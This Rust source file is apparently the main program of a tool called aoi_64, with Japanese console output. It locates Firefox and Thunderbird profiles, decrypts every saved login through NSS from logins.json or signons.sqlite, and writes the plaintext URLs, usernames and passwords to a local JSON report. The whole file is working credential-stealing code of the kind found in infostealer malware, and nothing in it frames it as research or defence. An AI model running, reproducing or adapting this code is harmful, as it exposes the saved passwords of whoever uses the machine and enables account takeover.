use aoi_64::{Config, AoiError};
use serde::{Deserialize, Serialize};
use std::time::{SystemTime, UNIX_EPOCH};

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct AuthReport {
    pub timestamp: u64,
    pub extraction_summary: ExtractionSummary,
    pub browser_passwords: Vec<BrowserPassword>,
    pub extraction_errors: Vec<String>,
    pub total_items: usize,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct ExtractionSummary {
    pub browsers_scanned: u32,
    pub passwords_found: u32,
    pub errors_encountered: u32,
    pub extraction_time_ms: u64,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct BrowserPassword {
    pub browser: String,
    pub url: String,
    pub username: String,
    pub password: String,
    pub creation_date: Option<String>,
}

impl Default for AuthReport {
    fn default() -> Self {
        Self {
            timestamp: SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs(),
            extraction_summary: ExtractionSummary::default(),
            browser_passwords: Vec::new(),
            extraction_errors: Vec::new(),
            total_items: 0,
        }
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let start_time = std::time::Instant::now();

    let config = load_extraction_config()?;
    print_extraction_config(&config);

    let mut report = AuthReport::default();

    // Firefox/Thunderbird のみ
    if config.collect_browser_passwords {
        match collect_firefox_passwords_detailed().await {
            Ok(passwords) => {
                report.extraction_summary.passwords_found = passwords.len() as u32;
                report.browser_passwords = passwords;
            }
            Err(e) => {
                report.extraction_summary.errors_encountered += 1;
                report
                    .extraction_errors
                    .push(format!("Firefox password collection error: {}", e));
            }
        }
    }

    report.extraction_summary.extraction_time_ms = start_time.elapsed().as_millis() as u64;
    report.total_items = report.browser_passwords.len();

    print_extraction_results(&report);
    save_report(&report).await?;
    Ok(())
}

fn load_extraction_config() -> Result<Config, AoiError> {
    let mut config = Config::default();
    config.collect_browser_passwords = true;
    if let Ok(config_content) = std::fs::read_to_string("config.json") {
        if let Ok(cfg) = serde_json::from_str::<Config>(&config_content) {
            return Ok(cfg);
        }
    }
    Ok(config)
}

fn print_extraction_config(config: &Config) {
    println!("\n⚙️  抽出設定:");
    println!(
        "   ブラウザパスワード: {}",
        if config.collect_browser_passwords {
            "✅"
        } else {
            "❌"
        }
    );
}

#[cfg(feature = "browser")]
async fn collect_firefox_passwords_detailed() -> Result<Vec<BrowserPassword>, AoiError> {
    use aoi_64::collectors::password_manager::{
        CredentialsBackend, JsonCredentials, SqliteCredentials,
    };

    let mut passwords = Vec::new();
    let profiles = get_firefox_profiles()?;

    for profile_path in profiles {
        let browser_name = detect_firefox_browser_type(&profile_path);
        let mut profile_passwords = Vec::new();

        if let Ok(nss_passwords) = collect_with_advanced_nss(&profile_path, browser_name).await {
            profile_passwords.extend(nss_passwords);
        }
        if profile_passwords.is_empty() {
            let json_path = profile_path.join("logins.json");
            if json_path.exists() {
                if let Ok(json_creds) = JsonCredentials::open(json_path) {
                    if let Ok(logins) = json_creds.iter() {
                        for (hostname, encrypted_username, encrypted_password, enc_type) in logins {
                            let (username, password) = attempt_decrypt_nss_credentials(
                                &profile_path,
                                &encrypted_username,
                                &encrypted_password,
                            )
                            .await;
                            profile_passwords.push(BrowserPassword {
                                browser: format!("{} (JSON)", browser_name),
                                url: hostname,
                                username,
                                password,
                                creation_date: Some(format!("EncType: {}", enc_type)),
                            });
                        }
                    }
                }
            }
        }
        if profile_passwords.is_empty() {
            let sqlite_path = profile_path.join("signons.sqlite");
            if sqlite_path.exists() {
                if let Ok(sqlite_creds) = SqliteCredentials::open(sqlite_path) {
                    if let Ok(logins) = sqlite_creds.iter() {
                        for (hostname, encrypted_username, encrypted_password, enc_type) in logins {
                            let (username, password) = attempt_decrypt_nss_credentials(
                                &profile_path,
                                &encrypted_username,
                                &encrypted_password,
                            )
                            .await;
                            profile_passwords.push(BrowserPassword {
                                browser: format!("{} (SQLite)", browser_name),
                                url: hostname,
                                username,
                                password,
                                creation_date: Some(format!("EncType: {}", enc_type)),
                            });
                        }
                    }
                }
            }
        }
        passwords.extend(profile_passwords);
    }

    Ok(passwords)
}

#[cfg(not(feature = "browser"))]
async fn collect_firefox_passwords_detailed() -> Result<Vec<BrowserPassword>, AoiError> {
    Err(AoiError::Config("Browser feature not enabled".to_string()))
}

#[cfg(feature = "browser")]
fn get_firefox_profiles() -> Result<Vec<std::path::PathBuf>, AoiError> {
    let mut profiles = Vec::new();
    if let Some(appdata) = std::env::var_os("APPDATA") {
        let appdata_path = std::path::PathBuf::from(appdata);
        let firefox_dir = appdata_path
            .join("Mozilla")
            .join("Firefox")
            .join("Profiles");
        profiles.extend(scan_firefox_directory(&firefox_dir));
        let thunderbird_dir = appdata_path.join("Thunderbird").join("Profiles");
        profiles.extend(scan_firefox_directory(&thunderbird_dir));
    }
    Ok(profiles)
}

#[cfg(feature = "browser")]
fn scan_firefox_directory(dir: &std::path::Path) -> Vec<std::path::PathBuf> {
    let mut profiles = Vec::new();
    if dir.exists() {
        if let Ok(entries) = std::fs::read_dir(dir) {
            for entry in entries.flatten() {
                if entry.file_type().map_or(false, |ft| ft.is_dir()) {
                    let profile_path = entry.path();
                    if profile_path.join("logins.json").exists() {
                        profiles.push(profile_path);
                    }
                }
            }
        }
    }
    profiles
}

#[cfg(feature = "browser")]
fn detect_firefox_browser_type(path: &std::path::Path) -> &'static str {
    let path_str = path.to_string_lossy();
    if path_str.contains("Thunderbird") {
        "Thunderbird"
    } else if path_str.contains("Firefox Developer Edition") {
        "Firefox Developer Edition"
    } else if path_str.contains("Firefox Nightly") {
        "Firefox Nightly"
    } else {
        "Firefox"
    }
}

#[cfg(feature = "browser")]
async fn collect_with_advanced_nss(
    profile_path: &std::path::Path,
    browser_name: &str,
) -> Result<Vec<BrowserPassword>, AoiError> {
    use aoi_64::collectors::password_manager::NssCredentials;
    let mut passwords = Vec::new();
    let nss_creds = NssCredentials::new(profile_path.to_path_buf());
    match nss_creds.get_decrypted_logins() {
        Ok(decrypted_logins) => {
            for login in decrypted_logins {
                passwords.push(BrowserPassword {
                    browser: format!("{} (NSS Decrypted)", browser_name),
                    url: login.hostname,
                    username: login.username,
                    password: login.password,
                    creation_date: Some(format!("EncType: {}", login.enc_type)),
                });
            }
        }
        Err(e) => {
            return Err(AoiError::Config(format!("NSS decryption failed: {}", e)));
        }
    }
    Ok(passwords)
}

#[cfg(feature = "browser")]
async fn attempt_decrypt_nss_credentials(
    profile_path: &std::path::Path,
    encrypted_username: &str,
    encrypted_password: &str,
) -> (String, String) {
    use aoi_64::collectors::firefox_nss::Nss;
    if let Ok(nss) = Nss::new() {
        if nss.initialize(profile_path).is_ok() {
            let username = if encrypted_username.is_empty() {
                "[EMPTY]".to_string()
            } else {
                nss.decrypt(encrypted_username).unwrap_or_else(|_| {
                    format!(
                        "[ENCRYPTED] {}",
                        &encrypted_username[..std::cmp::min(20, encrypted_username.len())]
                    )
                })
            };
            let password = if encrypted_password.is_empty() {
                "[EMPTY]".to_string()
            } else {
                nss.decrypt(encrypted_password)
                    .unwrap_or_else(|_| "[DECRYPT_FAILED]".to_string())
            };
            let _ = nss.shutdown();
            return (username, password);
        }
    }
    let username = if encrypted_username.is_empty() {
        "[EMPTY]".to_string()
    } else {
        encrypted_username.to_string()
    };
    let password = if encrypted_password.is_empty() {
        "[EMPTY]".to_string()
    } else {
        "[ENCRYPTED]".to_string()
    };
    (username, password)
}

fn print_extraction_results(report: &AuthReport) {
    println!("\n📊 サマリー:");
    println!(
        "  Firefox/Thunderbird パスワード: {} 件",
        report.extraction_summary.passwords_found
    );
    if !report.extraction_errors.is_empty() {
        println!("\n⚠️ エラー:");
        for e in &report.extraction_errors {
            println!("  {}", e);
        }
    }
}

async fn save_report(report: &AuthReport) -> Result<(), Box<dyn std::error::Error>> {
    let timestamp = chrono::Utc::now().format("%Y%m%d_%H%M%S");
    let json_filename = format!("auth_report_{}.json", timestamp);
    let json_content = serde_json::to_string_pretty(report)?;
    std::fs::write(&json_filename, json_content)?;
    println!("\n💾 レポート保存: {}", json_filename);
    Ok(())
}
